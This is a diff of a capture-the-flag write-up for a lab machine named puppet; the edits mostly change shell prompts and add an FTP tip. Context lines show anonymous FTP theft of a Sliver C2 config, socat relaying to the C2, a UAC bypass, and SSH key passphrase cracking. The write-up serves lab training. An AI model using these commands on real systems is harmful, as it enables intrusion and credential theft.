@@ -5,7 +5,7 @@ The initial reconnaissance focused on identifying services and potential vulnera
 
 To begin, an Nmap (Network Mapper) scan was performed against the IP address 10.10.155.231. Nmap is a powerful open-source tool for network discovery and security auditing. The -sV flag was used for version detection of services, -Pn to skip host discovery (assuming the host is up), and -ST for a full TCP connect scan, which is generally reliable
 
-┌──(toothless5143@kali)-[~]
+┌──(kali@kali)-[~]
 └─$ nmap -sV -Pn 10.10.155.231 -sT 
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-13 17:20 +06
 Nmap scan report for 10.10.155.231
@@ -26,7 +26,7 @@ The Nmap scan results were crucial, revealing several open TCP ports:
 Vulnerability Analysis & Exploitation
 The presence of an FTP server (vsftpd 3.0.5) on port 21 prompted an immediate check for anonymous access, a common misconfiguration. The standard ftp client was used to connect.
 
-┌──(toothless5143@kali)-[~]
+┌──(kali@kali)-[~]
 └─$ ftp 10.10.155.231
 Connected to 10.10.155.231.
 220 (vsFTPd 3.0.5)
@@ -65,23 +65,30 @@ local: sliver-client_linux remote: sliver-client_linux
 36515304 bytes received in 00:52 (673.09 KiB/s)
 The downloaded configuration file, red_127.0.0.1.cfg, was then examined.
 
-┌──(toothless5143@kali)-[~]
+If errored permission denied the troubleshoot
+
+ftp> lcd /tmp
+ftp> binary
+ftp> get red_127.0.0.1.cfg
+
+
+┌──(kali@kali)-[~]
 └─$ cat red_127.0.0.1.cfg 
 {"operator":"red","token":"bfbb238704ffecea42314144f4304fb67ffa216006c326fbee7318000e6b5542","lhost":"127.0.0.1","lport":31337,
 Its content confirmed it was indeed a Sliver client configuration file. The JSON structure included "lhost":"127.0.0.1" and "lport":31337. This meant that the Sliver C2 server on the puppet machine was configured to listen for client connections on its local loopback interface (127.0.0.1) at port 31337. This also implied that an existing implant (beacon) on another machine (file01) was trying to connect back to 10.10.155.231:31337, but the C2 server component itself was only directly accessible from the puppet machine.
 
 To enable the attacker’s sliver-client_linux to connect to this C2 server, the traffic needed to be relayed from the attacker's machine to the puppet server's localhost port. socat (Socket CAT) is a versatile utility for relaying data between two points. It was used on the attacker's Kali machine to create a TCP listener on port 31337. Any connection to this local port would then be forwarded to 10.10.155.231:31337. The reuseaddr option allows immediate reuse of the port, and fork allows socat to handle multiple connections.
 
-┌──(toothless5143@kali)-[~]
+┌──(kali@kali)-[~]
 └─$ sudo socat TCP-LISTEN:31337,reuseaddr,fork TCP:10.10.155.231:31337
 With this port forwarding in place, the downloaded sliver-client_linux binary was made executable (chmod +x sliver-client_linux). The downloaded configuration file (red_127.0.0.1.cfg) was then imported into the Sliver client. This tells the client how to connect to the C2 server.
 
-┌──(toothless5143@kali)-[~]
+┌──(kali@kali)-[~]
 └─$ ./sliver-client_linux import red_127.0.0.1.cfg 
 2025/05/13 17:50:24 Saved new client config to: /home/toothless5143/.sliver-client/configs/red_127.0.0.1.cfg
 Finally, the Sliver client was executed. It automatically attempted to connect to 127.0.0.1:31337, which, due to the socat tunnel, was effectively connecting to the C2 server on the puppet machine.
 
-┌──(toothless5143@kali)-[~]
+┌──(kali@kali)-[~]
 └─$ ./sliver-client_linux                           
 Connecting to 127.0.0.1:31337 ...
 
@@ -292,7 +299,7 @@ SeChangeNotifyPrivilege       Bypass traverse checking                          
 SeIncreaseWorkingSetPrivilege Increase a process working set                    Disabled
 To bypass UAC and obtain a high-integrity process, the UAC-BOF-Bonanza extension (https://github.com/icyguider/UAC-BOF-Bonanza) was utilized. This collection includes various UAC bypass techniques implemented as Beacon Object Files (BOFs). The SspiUacBypass tool from this repository was cloned to the attacker's machine and compiled using the provided Makefile.
 
-┌──(toothless5143@kali)-[~/tools/win-shareables]
+┌──(kali@kali)-[~/tools/win-shareables]
 └─$ git clone https://github.com/icyguider/UAC-BOF-Bonanza
 Cloning into 'UAC-BOF-Bonanza'...
 remote: Enumerating objects: 70, done.
@@ -302,10 +309,10 @@ remote: Total 70 (delta 17), reused 61 (delta 15), pack-reused 0 (from 0)
 Receiving objects: 100% (70/70), 137.66 KiB | 150.00 KiB/s, done.
 Resolving deltas: 100% (17/17), done.
 
-┌──(toothless5143@kali)-[~/tools/win-shareables]
+┌──(kali@kali)-[~/tools/win-shareables]
 └─$ cd UAC-BOF-Bonanza 
 
-┌──(toothless5143@kali)-[~/tools/win-shareables/UAC-BOF-Bonanza/SspiUacBypass]
+┌──(kali@kali)-[~/tools/win-shareables/UAC-BOF-Bonanza/SspiUacBypass]
 └─$ make        
 mkdir -p bin
 mkdir -p bin/standalone
@@ -313,7 +320,7 @@ x86_64-w64-mingw32-g++ -c src/SspiUacBypassBOF.cpp -w -o bin/SspiUacBypassBOF.o
 x86_64-w64-mingw32-g++ src/standalone/SspiUacBypass.cpp src/standalone/CreateSvcRpc.cpp -static -lsecur32 -s -w -o bin/standalone/SspiUacBypass.exe
 The compiled SspiUacBypass extension (a directory containing the BOF and its definition) was then copied into the Sliver client's local extensions directory (~/.sliver-client/extensions/).
 
-┌──(toothless5143@kali)-[~/tools/win-shareables/UAC-BOF-Bonanza]
+┌──(kali@kali)-[~/tools/win-shareables/UAC-BOF-Bonanza]
 └─$ cp -r SspiUacBypass ~/.sliver-client/extensions/
 Back in the Sliver console (still in the 278d83f2 medium-integrity beacon context), the new extension was loaded.
 
@@ -502,16 +509,16 @@ sliver (puppet-mtls) > download \\\\dc01.puppet.vl\\it\\.ssh\\ed25519.pub
 [*] Wrote 108 bytes (1 file successfully, 0 files unsuccessfully) to /home/toothless5143/puppet/\\dc01.puppet.vl\it\.ssh\ed25519.pub
 Inspection of the ed25519.pub file content (cat ed25519.pub on the attacker machine) showed a comment at the end: svc_puppet_lin_t1@puppet.vl. This strongly indicated that the private key was intended for the user svc_puppet_lin_t1 to SSH into the Linux server named puppet.vl (our puppet machine).
 
-┌──(toothless5143@kali)-[~]
+┌──(kali@kali)-[~]
 └─$ cat ed25519.pub
 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIDS4W6uOArXO9Sk20zh7L7wAhVJXtBJlE81UZTrWNTv svc_puppet_lin_t1@puppet.vl
 The ed25519 private key was likely passphrase-protected. To crack the passphrase, ssh2john (part of the John the Ripper suite) was used to convert the private key into a hash format that John the Ripper could understand.
 
-┌──(toothless5143@kali)-[~]
+┌──(kali@kali)-[~]
 └─$ ssh2john ed25519 > hash
 John the Ripper was then used with the rockyou.txt wordlist to crack the passphrase from the generated hash file.
 
-┌──(toothless5143@kali)-[~]
+┌──(kali@kali)-[~]
 └─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt 
 Using default input encoding: UTF-8
 Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
@@ -534,18 +541,18 @@ sliver (puppet-mtls) > portfwd add --bind 2222 -r 10.10.155.231:22
 [*] Port forwarding 127.0.0.1:2222 -> 10.10.155.231:22
 On the attacker’s machine, the downloaded ed25519 private key file likely had Windows-style line endings (CRLF). It was converted to Unix line endings (LF) using dos2unix. The content was then saved to a new file lin_key, and its permissions were set to 600 (read/write for owner only), which is required by most SSH clients for private keys.
 
-┌──(toothless5143@kali)-[~]
+┌──(kali@kali)-[~]
 └─$ dos2unix ed25519
 dos2unix: converting file ed25519 to Unix format...
 
-┌──(toothless5143@kali)-[~]
+┌──(kali@kali)-[~]
 └─$ cat ed25519 > lin_key                                  
 
-┌──(toothless5143@kali)-[~]
+┌──(kali@kali)-[~]
 └─$ chmod 600 lin_key    
 Finally, an SSH connection was established to the puppet server, using the lin_key private key, targeting svc_puppet_lin_t1@puppet.vl (which resolved to 127.0.0.1 due to the port forward), on port 2222. The -t flag forces pseudo-terminal allocation, which is often needed for interactive sessions.
 
-┌──(toothless5143@kali)-[~]
+┌──(kali@kali)-[~]
 └─$ ssh -i lin_key -t 'svc_puppet_lin_t1@puppet.vl'@127.0.0.1 -p 2222
 Enter passphrase for key 'lin_key': 
 Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-122-generic x86_64)
